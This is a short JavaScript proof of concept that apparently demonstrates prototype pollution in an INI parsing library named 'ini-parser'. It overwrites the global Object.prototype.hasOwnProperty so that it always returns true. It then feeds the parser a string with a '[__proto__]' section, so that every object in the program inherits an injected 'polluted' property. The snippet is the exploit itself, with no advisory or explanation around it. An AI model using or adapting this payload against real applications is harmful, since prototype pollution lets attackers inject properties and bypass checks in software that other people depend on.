Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
let a = require('ini-parser');
a.parse('[__proto__]\npolluted=yes');
console.log({}.polluted);